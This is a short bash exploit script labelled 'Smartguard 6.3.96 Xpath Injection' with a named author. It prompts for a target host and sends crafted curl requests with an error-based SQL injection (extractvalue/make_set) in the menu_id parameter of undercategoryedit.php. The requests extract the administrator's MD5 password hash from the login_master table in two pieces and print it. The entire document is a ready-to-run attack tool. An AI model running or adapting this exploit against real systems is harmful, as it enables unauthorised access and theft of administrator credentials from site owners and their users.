#!/bin/bash
# Functions 
hash1(){
curl -s "http://$pinu/undercategoryedit.php?menu_id=-410%20and%20extractvalue(1,(select%20make_set(511,0,SUBSTRING(password,1,20),1)%20from%20login_master%20limit%200,1%20))--%20-" | awk -F',' '{print $2}'
}
hash2(){
curl -s "http://$pinu/undercategoryedit.php?menu_id=-410%20and%20extractvalue(1,(select%20make_set(511,0,SUBSTRING(password,21,40),1)%20from%20login_master%20limit%200,1%20))--%20-" | awk -F',' '{print $2}'
}
# Descriptions
echo "+--------------------------------------------------+"
echo "|Exploit Title: Smartguard 6.3.96 Xpath Injection  |"
echo "|Exploit Author: Suvadip Kar | @SpiderSec          |"                        
echo "+--------------------------------------------------+"
read -p '[*] Enter URL (Without http:// OR https://) :' pinu
# Final Product
VAR1=$(hash1)
VAR2=$(hash2)
echo ""
echo "USERNAME : admin" 
echo "PASSWORD : ${VAR1}${VAR2}" " (MD5)"



